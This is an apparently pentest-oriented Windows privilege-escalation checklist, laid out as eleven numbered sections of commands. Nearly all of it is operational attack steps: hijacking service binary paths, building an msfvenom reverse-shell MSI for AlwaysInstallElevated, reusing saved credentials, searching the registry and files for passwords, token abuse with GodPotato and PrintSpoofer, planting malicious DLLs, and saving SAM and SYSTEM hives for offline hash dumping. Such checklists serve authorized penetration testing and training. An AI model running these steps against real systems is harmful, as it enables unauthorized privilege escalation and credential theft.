# Windows Box Checklist

## 1. Situational awareness
```cmd
whoami /all
hostname; ipconfig /all
net user; net localgroup administrators
systeminfo | findstr /B /C:"OS" /C:"Hotfix"
```

## 2. Automated enum
```cmd
winpeas.exe
# or
powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck"
```

## 3. Weak service permissions
```cmd
.\accesschk.exe -uwcqv * /accepteula
sc qc <service>
# SERVICE_ALL_ACCESS on service + writable binary path?
# → sc config <svc> binpath= "C:\path\to\shell.exe" && net stop <svc> && net start <svc>
```

## 4. Unquoted service paths
```cmd
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows"
# Path has space and no quotes? → drop binary in highest writable dir of path
```

## 5. AlwaysInstallElevated
```cmd
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
# Both = 1? → msfvenom -p windows/x64/shell_reverse_tcp ... -f msi → msiexec /quiet /qn /i shell.msi
```

## 6. Stored credentials
```cmd
cmdkey /list
# Saved creds? → runas /savecred /user:<user> cmd.exe

reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s

# Autologon
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
```

## 7. Interesting files
```cmd
dir /s /b C:\*.txt C:\*.ini C:\*.config C:\*.bak 2>nul | findstr /i "pass secret key cred"
dir /s /b "C:\Program Files" "C:\Program Files (x86)" "C:\Users" 2>nul | findstr /i "pass.txt secret.txt"
type C:\Windows\System32\drivers\etc\hosts
```

## 8. Token abuse
```cmd
whoami /priv
# SeImpersonatePrivilege / SeAssignPrimaryTokenPrivilege?
# → PrintSpoofer, GodPotato, JuicyPotatoNG
.\GodPotato.exe -cmd "cmd /c whoami"
.\PrintSpoofer.exe -i -c cmd
```

## 9. DLL hijacking
```cmd
# Find service running as SYSTEM with missing DLL
.\procmon.exe  # filter: Result is NAME NOT FOUND + Path ends in .dll
# Drop malicious DLL in writable dir in search order
```

## 10. Password files / SAM
```cmd
# If SYSTEM:
reg save HKLM\SAM C:\sam.bak
reg save HKLM\SYSTEM C:\sys.bak
# exfil and: impacket-secretsdump -sam sam.bak -system sys.bak LOCAL
```

## 11. Check for AD
```cmd
systeminfo | findstr /i "domain"
# Domain joined? → Go to Active Directory checklist
```
